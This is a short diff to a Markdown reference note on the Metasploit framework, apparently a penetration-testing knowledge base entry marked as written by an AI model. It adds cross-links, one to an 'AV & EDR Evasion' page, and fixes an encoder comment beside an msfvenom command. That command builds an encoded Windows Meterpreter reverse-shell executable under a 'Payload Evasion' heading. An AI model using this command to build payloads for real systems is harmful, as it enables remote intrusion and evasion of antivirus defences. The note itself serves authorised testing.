@@ -4,7 +4,7 @@
 
 ## What is this?
 
-Open-source exploitation framework — a collection of exploits, auxiliary modules, post-exploitation tools, and payload generators. msfconsole is the primary interface. Meterpreter is the in-memory post-exploitation agent. msfvenom generates standalone payloads — see [[Shells & Payloads]] for full msfvenom reference.
+Open-source exploitation framework — a collection of exploits, auxiliary modules, post-exploitation tools, and payload generators. msfconsole is the primary interface. Meterpreter is the in-memory post-exploitation agent. msfvenom generates standalone payloads — see [[Shells & Payloads]] for full msfvenom reference. Pairs with [[Shells & Payloads]], [[Pivoting, Tunneling & Port Forwarding]], [[AV & EDR Evasion]].
 
 ---
 
@@ -449,7 +449,8 @@ run -j
 ## Payload Evasion (msfvenom)
 
 ```bash
-# Encode with shikata_ga_nai (multiple passes — note: reliably detected by modern AV)
+# Encode with x64/xor_dynamic (multiple passes — note: reliably detected by modern AV).
+# NB: shikata_ga_nai is x86-only; x64 payloads use the xor/xor_dynamic encoders below.
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 \
   -e x64/xor_dynamic -i 5 -f exe -o payload.exe
 
@@ -512,5 +513,5 @@ msfvenom -l encoders
 ---
 
 *Created: 2026-03-02*
-*Updated: 2026-05-14*
+*Updated: 2026-07-21*
 *Model: claude-sonnet-4-6*
